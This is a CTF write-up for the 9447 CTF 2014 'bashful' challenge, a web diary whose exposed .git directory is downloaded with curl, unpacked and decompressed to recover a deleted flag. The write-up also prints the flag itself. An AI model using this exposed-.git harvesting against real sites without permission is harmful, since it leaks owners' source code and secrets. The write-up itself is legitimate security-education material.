## bashful ##
Writeup by @auscompgeek.

> **Note**: This is the second (ironically easier) of the two git challenges,
> the first being [tumorous](tumorous.md).  This writeup has been written under
> the assumption that the first has been read.

### tl;dr ###
* `.git` repo was exposed (with indexes on after the challenge was "fixed")
* get and unpack the pack file
* read the blob objects (like in tumorous)

### Introduction ###
Upon visiting <http://bashful.9447.plumbing/>, we are presented with a
diary-like page, similar to tumorous.  They seem identical at first glance,
however, a closer inspection reveals something more.

Here are the diary entries:

```
13/2/2004: I learned how to html, yay!
12/4/2004: I learned how to use git, yay!
13/4/2004: Hidden my 'repository' so people can't access it. I have a feeling I will need to protect something soon.
08/9/2004: Forged a token from the whispering iron. It is very dear to me, I should protect it.
10/9/2004: I put my token in a text file to protect it from alien mind readers from planet Zblaargh.
10/9/2004: I can't forget my token. What do I do? I should also pack so I'm ready to leave soon.
11/9/2004: I panicked and deleted the token. It is the work of evil doers.
12/9/2004: My token is lost. My life has no meaning now. I'm going to watch Louie season 4.
```

Note the extra sentence in the differing entry for 10/9/2004:

> I should also pack so I'm ready to leave soon.

This implies that we may need to look at git pack files.

### Tips and Background ###
In addition to the tips in the tumorous writeup, it is useful to know about the
`git unpack-objects` command.  This reads an object pack file from stdin, and
unpacks the objects within into the current git repo.

### Exploitation ###
As before, we need to get a git blob object that represents `token`.

If we navigate to <http://bashful.9447.plumbing/.git/objects/>, we find that
all the objects are gone.  Navigate to the `pack` subdirectory however, and we
find a pack file named `pack-deff83d57714493c6d317394f3542da8e396f887.pack`.
We can download this and run `git unpack-objects` in a git repo:

```bash
$ cd $(mktemp -d)
$ git init
Initialized empty Git repository in [temporary directory]
$ curl http://bashful.9447.plumbing/.git/objects/pack/pack-deff83d57714493c6d317394f3542da8e396f887.pack | git unpack-objects
Unpacking objects: 100% (4/4), done.
```

Now that we have all the objects in our git repo, we can now find the blob
object.  I was lazy, so I just decompressed _all_ the objects:

```
$ cd .git/objects
$ for file in ??/*; do (printf "\x1f\x8b\x08\x00\x00\x00\x00\x00"; cat $file) | gunzip | cat -v; done
gzip: stdin: unexpected end of file
commit 296^@tree a475f4d3b14d659ee9d08d727a8dee7d896d2ca9
parent ec972f9af79a09129021a30e7f08099aa2b8a81d
author root <root@ip-172-31-10-205.ap-southeast-2.compute.internal> 1417230572 +0000
committer root <root@ip-172-31-10-205.ap-southeast-2.compute.internal> 1417230572 +0000

My precious flag now exists

gzip: stdin: unexpected end of file
blob 45^@9447{I_JUST_THINK_BITCOIN_WILL_DIE_OUT_SOON}

gzip: stdin: unexpected end of file
tree 71^@100644 index.html^@M-2qM-:^H^TWHlM-^XM-N+M-^V
M-^H\M-_ex^^M-j100644 token^@-(M-,M-pM-^_M-DBO~^W^AM-=|M-^JmM-rM-^^lM-^_M-a
gzip: stdin: unexpected end of file
blob 731^@<html>
<head> </head>
<body>
13/2/2004: I learned how to html, yay!<br>
12/4/2004: I learned how to use git, yay!<br>
13/4/2004: Hidden my 'repository' so people can't access it. I have a feeling I will need to protect something soon.<br>
08/9/2004: Forged a token from the whispering iron. It is very dear to me, I should protect it.<br>
10/9/2004: I put my token in a text file to protect it from alien mind readers from planet Zblaargh.<br>
10/9/2004: I can't forget my token. What do I do? I should pack so I'm ready to leave soon.<br>
11/9/2004: I panicked and deleted the token. It is the work of evil doers.<br>
12/9/2004: My token is lost. My life has no meaning now. I'm going to watch Louie season 4.<br>
</body>
</html>
```

Our flag clearly is `9447{I_JUST_THINK_BITCOIN_WILL_DIE_OUT_SOON}`.
Hmm... will Bitcoin die out though?

### Notes ###
It may be easier (hint: it *is*) to `wget` the entire `.git` directory, like
[mathiasbynens did](/ctfs/write-ups/tree/master/9447-ctf-2014/bashful).
I outline this process as this is along the lines of the original intended
solution (before they realised it was impossible).
